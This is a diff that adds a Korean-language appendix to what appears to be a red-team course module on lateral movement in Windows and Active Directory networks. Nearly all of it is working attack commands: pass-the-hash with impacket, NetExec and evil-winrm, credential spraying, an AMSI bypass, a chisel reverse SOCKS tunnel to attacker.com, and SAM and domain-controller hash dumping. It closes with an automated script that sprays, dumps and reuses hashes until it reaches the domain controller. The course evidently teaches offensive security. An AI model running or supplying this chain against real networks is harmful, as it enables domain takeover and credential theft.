@@ -637,3 +637,273 @@ graph LR
 
 **학생 액션**: log gap 탐지 룰.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course13 — Week 08 측면이동)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | impacket suite | impacket-psexec / wmiexec / smbexec |
+| s2 | NetExec (CME) | nxc smb / winrm |
+| s3 | evil-winrm | evil-winrm |
+| s4 | chisel HTTP tunnel | chisel |
+| s5 | sshuttle | sshuttle |
+| s6 | proxychains4 | proxychains4 |
+| s7 | impacket-secretsdump | impacket-secretsdump |
+| s8 | BloodHound path | bloodhound + neo4j |
+
+### 학생 환경 준비
+
+```bash
+# === 모두 week04, week05 에 이미 ===
+pip install impacket
+pipx install git+https://github.com/Pennyw0rth/NetExec
+sudo gem install evil-winrm
+sudo apt install -y proxychains4 sshuttle
+
+# chisel
+go install github.com/jpillora/chisel@latest
+
+# BloodHound
+sudo apt install -y bloodhound bloodhound.py neo4j
+```
+
+### Lateral Movement 5 패턴
+
+```bash
+# === 패턴 1: SSH (Linux) ===
+
+# 1-1) 자격증명 사용
+ssh user@10.0.0.5
+
+# 1-2) Key-based (자동, 비번 없음)
+ssh -i private_key user@10.0.0.5
+
+# 1-3) ProxyJump (다중 hop)
+ssh -J user@dmz-host user@internal-host
+
+# 1-4) Dynamic SOCKS (network 전체)
+ssh -D 1080 user@dmz-host
+proxychains4 nmap -sT 10.0.0.0/24
+
+# === 패턴 2: SMB (Win 환경) ===
+
+# 2-1) PsExec (가장 표준)
+impacket-psexec 'admin:Pa$$w0rd@10.0.0.5'                  # interactive shell
+impacket-psexec 'CORP/admin:Pa$$w0rd@10.0.0.5' "whoami"    # 단일 명령
+
+# 2-2) WmiExec (PsExec 보다 stealthy)
+impacket-wmiexec 'admin:Pa$$w0rd@10.0.0.5'
+
+# 2-3) SmbExec (Win Service 사용)
+impacket-smbexec 'admin:Pa$$w0rd@10.0.0.5'
+
+# 2-4) AtExec (Scheduled Task — 마지막 수단)
+impacket-atexec 'admin:Pa$$w0rd@10.0.0.5' "whoami"
+
+# === 패턴 3: Pass-the-Hash (PtH) ===
+impacket-psexec -hashes :NTHASH 'admin@10.0.0.5'
+impacket-wmiexec -hashes :NTHASH 'admin@10.0.0.5'
+
+# === 패턴 4: NetExec (multi-host 자동) ===
+nxc smb 10.0.0.0/24                                        # SMB enum
+nxc smb 10.0.0.0/24 -u admin -p 'Pa$$w0rd'                 # spray
+nxc smb 10.0.0.0/24 -u admin -H 'NTHASH'                   # PtH
+nxc winrm 10.0.0.5 -u admin -H 'NTHASH'                    # WinRM PtH
+nxc smb 10.0.0.5 -u admin -H 'NTHASH' -x 'whoami'          # 명령 실행
+
+# === 패턴 5: WinRM (PowerShell remoting) ===
+evil-winrm -i 10.0.0.5 -u admin -p 'Pa$$w0rd'
+evil-winrm -i 10.0.0.5 -u admin -H 'NTHASH'                # PtH
+
+# === 패턴 6: WMI (PowerShell) ===
+# Win target 에서 (이미 침투 후):
+# Invoke-Command -ComputerName 10.0.0.5 -ScriptBlock { ... }
+
+# === 패턴 7: RDP ===
+xfreerdp /v:10.0.0.5 /u:admin /p:'Pa$$w0rd'
+xfreerdp /v:10.0.0.5 /u:admin /pth:NTHASH                  # PtH
+```
+
+### Tunneling 통합 (week03 + lateral)
+
+```bash
+# === Scenario: 외부 attacker → DMZ → Internal → DC ===
+
+# 1) Attacker 가 DMZ 침투 (sliver beacon)
+# DMZ host 에 sliver beacon 실행
+
+# 2) sliver portfwd 으로 attacker 측에서 internal 접근
+sliver (dmz) > portfwd add --remote 22 --local 2222
+ssh -p 2222 user@127.0.0.1                                 # DMZ 의 22 포트로
+
+# 3) DMZ 에서 internal 발견 (proxy chain 사용)
+sliver (dmz) > shell
+$ ssh -D 1080 user@dmz-internal &
+$ exit
+
+# Attacker 측:
+ssh -p 2222 -L 1080:localhost:1080 user@127.0.0.1          # DMZ 의 SOCKS proxy attacker 로
+proxychains4 nmap -sT 192.168.0.0/24
+
+# 4) Internal 침투 후 DC path 발견 (BloodHound)
+bloodhound-python -d corp.local -u user -p 'Pa$$w0rd' \
+    -ns 10.0.0.1 -c All --zip
+
+# 5) Domain Admin path 따라 lateral
+# Path: USER → COMPUTER1 (HasSession) → user2 (LocalAdmin) → DC
+
+# 6) COMPUTER1 침투
+proxychains4 impacket-psexec 'corp.local/user:Pa$$w0rd@COMPUTER1'
+
+# 7) COMPUTER1 에서 SAM/LSA dump
+proxychains4 impacket-secretsdump 'corp.local/user:Pa$$w0rd@COMPUTER1' -local
+# 발견: user2 NTLM hash
+
+# 8) PtH 으로 user2 권한 → DC 침투
+proxychains4 nxc smb DC01 -u user2 -H 'NTHASH'
+proxychains4 impacket-secretsdump -just-dc 'user2:hash@DC01'
+# 모든 AD hash dump!
+```
+
+### chisel — 외부 → 내부망 통합
+
+```bash
+# === Scenario: HTTP 만 허용된 환경 ===
+
+# 1) Attacker (외부, 내부 망 접근 불가)
+chisel server -p 443 --reverse --auth user:pass
+
+# 2) 침투한 내부 host 에서 chisel client (reverse tunnel)
+./chisel client https://attacker.com:443 \
+    --auth user:pass \
+    R:1080:socks                                           # reverse SOCKS
+
+# 3) Attacker 의 1080 SOCKS proxy → 침투 host 의 모든 네트워크
+proxychains4 nmap -sT 10.0.0.0/24
+proxychains4 impacket-psexec 'admin:Pa$$w0rd@10.0.0.5'
+
+# === sshuttle 대안 (transparent — 앱 변경 X) ===
+sudo sshuttle -r user@dmz-host 10.0.0.0/24 --dns
+# 모든 10.0.0.x traffic 자동으로 dmz 통해
+nmap -sT 10.0.0.5                                          # 자동 tunnel
+```
+
+### evil-winrm (PowerShell remoting)
+
+```bash
+# === 1. Password ===
+evil-winrm -i 10.0.0.5 -u admin -p 'Pa$$w0rd'
+
+# Evil-WinRM 안에서:
+*Evil-WinRM* PS C:\Users\admin> whoami
+*Evil-WinRM* PS C:\Users\admin> net user                   # 모든 user
+*Evil-WinRM* PS C:\Users\admin> ipconfig
+*Evil-WinRM* PS C:\Users\admin> upload /tmp/payload C:\temp\payload.exe
+*Evil-WinRM* PS C:\Users\admin> download C:\Users\admin\sensitive.txt
+
+# === 2. Pass-the-Hash ===
+evil-winrm -i 10.0.0.5 -u admin -H 'NTHASH'
+
+# === 3. Kerberos ticket ===
+evil-winrm -i 10.0.0.5 -u admin -r corp.local
+
+# === 4. Built-in functions ===
+*Evil-WinRM* PS> menu                                       # 모든 기능
+*Evil-WinRM* PS> Bypass-4MSI                               # AMSI bypass
+*Evil-WinRM* PS> Invoke-Binary /opt/payload.exe            # 메모리 only
+```
+
+### BloodHound — Lateral Path 자동 탐색
+
+```bash
+# === 1. 데이터 수집 (week04 재사용) ===
+bloodhound-python -d corp.local -u user -p 'Pa$$w0rd' \
+    -ns 10.0.0.1 -c All --zip
+
+# === 2. Neo4j ===
+sudo systemctl start neo4j
+
+# === 3. BloodHound GUI ===
+bloodhound &
+
+# === 4. 핵심 query ===
+# Pre-built:
+# - Find Shortest Path to Domain Admin
+# - Find Computers where Domain Users are Local Admin
+# - Find Users with HasSession to High-Value Targets
+# - Find AS-REP Roastable / Kerberoastable
+# - Find Computers with Unconstrained Delegation
+
+# Custom Cypher (Web UI Raw Query):
+# 모든 lateral path
+MATCH p=allShortestPaths(
+    (u:User {name:"USER@CORP.LOCAL"})-[*1..6]->(c:Computer)
+)
+RETURN p
+
+# Domain Admin 까지의 모든 path
+MATCH p=shortestPath(
+    (u:User {name:"USER@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
+)
+RETURN p
+
+# 우리가 LocalAdmin 인 모든 host
+MATCH (u:User {name:"USER@CORP.LOCAL"})-[:AdminTo|MemberOf*1..]->(c:Computer)
+RETURN c.name
+```
+
+### 통합 lateral movement chain
+
+```bash
+#!/bin/bash
+# /opt/scripts/lateral-chain.sh
+# 자동 lateral movement chain
+
+USER=$1
+PASSWORD=$2
+DOMAIN=corp.local
+DC=10.0.0.1
+
+# === 1. BloodHound 데이터 수집 ===
+bloodhound-python -d $DOMAIN -u $USER -p "$PASSWORD" \
+    -ns $DC -c All --zip
+
+# === 2. Path 분석 (자동 — Neo4j Cypher) ===
+neo4j-shell -file /tmp/find-path.cypher > /tmp/path.txt
+
+# === 3. NetExec 으로 모든 host enum ===
+nxc smb 10.0.0.0/24 -u $USER -p "$PASSWORD"
+
+# === 4. 자격증명 spray (혹시 다른 host 에서 admin?) ===
+nxc smb 10.0.0.0/24 -u $USER -p "$PASSWORD" --continue-on-success
+
+# === 5. 발견된 LocalAdmin host 에서 SAM dump ===
+ADMIN_HOSTS=$(nxc smb 10.0.0.0/24 -u $USER -p "$PASSWORD" 2>&1 | grep "Pwn3d!" | awk '{print $4}')
+
+for host in $ADMIN_HOSTS; do
+    echo "=== Dumping $host ==="
+    impacket-secretsdump $DOMAIN/$USER:"$PASSWORD"@$host > /tmp/dump-$host.txt
+done
+
+# === 6. NTLM hash 추출 ===
+grep -h ':::' /tmp/dump-*.txt | awk -F: '{print $1":"$4}' | sort -u > /tmp/all-hashes.txt
+
+# === 7. 새 자격증명 으로 다시 spray ===
+while IFS=: read user hash; do
+    echo "=== Trying $user with hash ==="
+    nxc smb 10.0.0.0/24 -u $user -H $hash
+done < /tmp/all-hashes.txt
+
+# === 8. Domain Admin hash 발견 시 → DC 침투 ===
+DA_HASH=$(grep "domain admin" /tmp/dump-*.txt | awk -F: '{print $4}')
+[ -n "$DA_HASH" ] && {
+    impacket-secretsdump -just-dc $DOMAIN/admin:hash@$DC
+    # 또는 Golden Ticket
+}
+```
+
+학생은 본 8주차에서 **impacket suite + NetExec + evil-winrm + chisel + sshuttle + proxychains4 + BloodHound** 7 도구로 lateral movement 의 5 패턴 (SSH / SMB / PtH / NetExec / WinRM) + tunneling 통합 chain 을 OSS 만으로 익힌다.
